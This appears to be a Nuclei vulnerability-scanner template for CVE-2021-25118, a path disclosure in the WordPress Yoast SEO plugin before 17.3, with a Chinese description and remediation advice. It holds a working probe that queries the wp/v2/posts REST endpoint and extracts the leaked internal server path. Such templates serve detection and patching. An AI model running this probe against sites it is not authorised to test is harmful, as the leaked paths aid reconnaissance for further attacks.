id: CVE-2021-25118
info:
  name: Yoast SEO < 17.3 - Path Disclosure
  author:
  - l0ne1y
  tags:
  - wordpress
  - cve2021
  - wp-plugin
  - fpd
  - cve
  - wp
  description: "WordPress Plugin Yoast SEO 未授权信息泄露漏洞   \nWordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress
    plugin是WordPress开源的一个应用插件。\n\nWordPress 的Yoast SEO 插件17.3之前版本存在信息泄露漏洞，该漏洞源于插件通过wp/v2/posts
    REST端点公开了帖子中特色图片的完整内部路径，这可以帮助攻击者识别其他漏洞，或在攻击其他已识别漏洞的过程中提供帮助。"
  reference:
  - https://wpscan.com/vulnerability/2c3f9038-632d-40ef-a099-6ea202efb550
  - https://nvd.nist.gov/vuln/detail/cve-2021-25118
  - https://plugins.trac.wordpress.org/changeset/2608691
  severity: medium
  classification:
    cve-id:
    - cve-2021-25118
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://wpscan.com/vulnerability/2c3f9038-632d-40ef-a099-6ea202efb550

    临时修复方案：
    1、敏感路径禁止直接暴漏在互联网，需通过VPN等较为安全的接入方式访问内部系统。
    2、敏感路径所有页面开启身份认证，根据情况选择对应方式（认证用户，用户名密码）。
    3、限制IP访问，绑定固定的IP访问敏感路径。
requests:
- matchers:
  - type: regex
    regex:
    - '"path":"(.*)/wp-content\\(.*)","size'
  - type: word
    part: header
    words:
    - application/json
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    regex:
    - '"path":"(.*)/wp-content\\(.*)","size'
    group: 1
    part: body
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-json/wp/v2/posts?per_page=1'
  method: GET
